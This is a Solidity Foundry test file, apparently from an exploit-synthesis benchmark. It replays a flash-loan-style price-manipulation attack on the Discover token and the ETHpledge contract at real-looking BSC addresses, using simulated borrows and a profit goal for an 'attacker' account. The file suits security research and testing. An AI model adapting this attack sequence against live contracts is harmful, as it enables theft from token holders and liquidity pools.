// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/Helper.sol";
import {BUSD} from "@utils/BUSD.sol";
import {Discover} from "./contracts/Discover.sol";
import {ETHpledge} from "./contracts/ETHpledge.sol";
import {UniswapV2Pair} from "@uniswapv2/UniswapV2Pair.sol";
contract DiscoverTestBase is Test, Helper {
    address busdholder = address(0x8894E0a0c962CB723c1976a4421c95949bE2D4E3);
    address attacker = address(0x06B912354B167848a4A608a56BC26C680DAD3D79);
    address attacker1 = address(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930);
    BUSD busd = BUSD(payable(0x55d398326f99059fF775485246999027B3197955));
    Discover disc =
        Discover(payable(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267));
    UniswapV2Pair pair =
        UniswapV2Pair(payable(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d));
    ETHpledge ethpledge =
        ETHpledge(payable(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7));
    uint256 balanceOfbusdattacker;
    modifier foray() {
        _;
    }
    function setUp() public {
        balanceOfbusdattacker = busd.balanceOf(attacker);
    }
    function printBalance(string memory tips) public {
        emit log_string(tips);
        address[] memory token_addrs = new address[](2);
        string[] memory token_names = new string[](2);
        address[] memory user_addrs = new address[](7);
        string[] memory user_names = new string[](7);
        token_addrs[0] = address(busd);
        token_names[0] = "busd";
        token_addrs[1] = address(disc);
        token_names[1] = "disc";
        user_addrs[0] = attacker;
        user_names[0] = "attacker";
        user_addrs[1] = busdholder;
        user_names[1] = "busdholder";
        user_addrs[2] = attacker1;
        user_names[2] = "attacker1";
        user_addrs[3] = address(busd);
        user_names[3] = "busd";
        user_addrs[4] = address(disc);
        user_names[4] = "disc";
        user_addrs[5] = address(pair);
        user_names[5] = "pair";
        user_addrs[6] = address(ethpledge);
        user_names[6] = "ethpledge";
        queryERC20BalanceBatch(
            token_addrs,
            token_names,
            user_addrs,
            user_names
        );
    }
    function attackGoal() public view returns (bool) {
        return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
    }
    function borrow_busd_pair(uint256 amount) internal foray {
        vm.stopPrank();
        vm.prank(address(pair));
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }
    function payback_busd_pair(uint256 amount) internal foray {
        busd.transfer(address(pair), amount);
    }
    function borrow_disc_pair(uint256 amount) internal foray {
        vm.stopPrank();
        vm.prank(address(pair));
        disc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }
    function payback_disc_pair(uint256 amount) internal foray {
        disc.transfer(address(pair), amount);
    }
    function borrow_busd_busdholder(uint256 amount) internal foray {
        vm.stopPrank();
        vm.prank(address(busdholder));
        busd.transfer(attacker, amount);
        vm.startPrank(attacker);
    }
    function payback_busd_busdholder(uint256 amount) internal foray {
        busd.transfer(address(busdholder), amount);
    }
    function borrow_disc_busdholder(uint256 amount) internal foray {
        vm.stopPrank();
        vm.prank(address(busdholder));
        disc.transfer(attacker, amount);
        vm.startPrank(attacker);
    }
    function payback_disc_busdholder(uint256 amount) internal foray {
        disc.transfer(address(busdholder), amount);
    }
    function swap_pair_attacker_busd_disc(
        uint256 amount,
        uint256 amountOut
    ) internal foray {
        busd.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }
    function swap_pair_attacker_disc_busd(
        uint256 amount,
        uint256 amountOut
    ) internal foray {
        disc.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }
    function swap_ethpledge_attacker_busd_disc(
        uint256 amount,
        uint256 amountOut
    ) internal foray {
        busd.approve(address(ethpledge), type(uint256).max);
        ethpledge.pledgein(attacker1, amount);
        vm.stopPrank();
        vm.startPrank(attacker1);
        disc.transfer(attacker, disc.balanceOf(attacker1));
        vm.stopPrank();
        vm.startPrank(attacker);
    }
    function test_gt() public {
        vm.startPrank(attacker);
        borrow_busd_busdholder(2100e18);
        printBalance("After step0 ");
        borrow_busd_pair(19810e18);
        printBalance("After step1 ");
        swap_ethpledge_attacker_busd_disc(2000e18, 1);
        printBalance("After step2 ");
        payback_busd_pair((19810e18 * 1003) / 1000);
        printBalance("After step3 ");
        swap_pair_attacker_disc_busd(
            disc.balanceOf(attacker),
            (getAmountOut(
                address(pair),
                disc.balanceOf(attacker),
                address(disc)
            ) * 9) / 10
        );
        printBalance("After step4 ");
        payback_busd_busdholder((2100e18 * 1003) / 1000);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }
    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt4 >= amt1);
        borrow_busd_busdholder(amt0);
        borrow_busd_pair(amt1);
        swap_ethpledge_attacker_busd_disc(amt2, amt3);
        payback_busd_pair(amt4);
        swap_pair_attacker_disc_busd(amt5, amt6);
        payback_busd_busdholder(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
